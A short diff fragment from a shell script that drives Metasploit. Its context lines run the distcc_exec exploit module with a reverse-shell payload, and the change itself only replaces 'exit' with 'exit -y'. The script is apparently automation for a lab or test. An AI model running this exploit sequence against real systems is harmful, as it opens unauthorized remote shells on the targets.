@@ -56,7 +56,7 @@ sleep 5
 use exploit/unix/misc/distcc_exec
 set PAYLOAD cmd/unix/reverse
 run -z
-exit
+exit -y
 EOF
 
 # -----------------------------------------------------------------
